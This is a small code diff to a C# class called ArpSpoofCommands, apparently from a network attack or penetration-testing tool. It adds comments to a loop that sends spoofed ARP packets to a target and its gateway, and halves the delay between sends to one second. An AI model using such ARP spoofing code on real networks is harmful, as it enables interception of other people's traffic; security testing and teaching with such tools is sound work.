@@ -42,8 +42,11 @@ public class ArpSpoofCommands
         {
             while (!ct.IsCancellationRequested)
             {
+                // Send spoofed ARP packets to the target and gateway
                 PacketBuild.Spoof(_device, _targetIp, _targetMac, _targetGateway, _targetGatewayMac);
-                await Task.Delay(2000, ct);
+
+                // Wait for 1 second before sending the next packets
+                await Task.Delay(1000, ct);
             }
         }
         catch (TaskCanceledException)
